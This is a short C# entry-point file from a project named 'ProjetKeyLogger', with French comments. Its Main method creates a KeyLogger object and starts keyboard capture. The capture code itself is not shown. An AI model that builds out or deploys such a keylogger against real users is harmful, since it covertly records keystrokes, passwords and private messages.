﻿using System;
using System.Linq;

namespace ProjetKeyLogger
{
    static class Program
    {
        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        static void Main()
        {
            //création de l'objet KeyLogger
            KeyLogger key_logger = new KeyLogger();

            //Lancement de la capture clavier
            key_logger.capture();
            
        }
    }
}
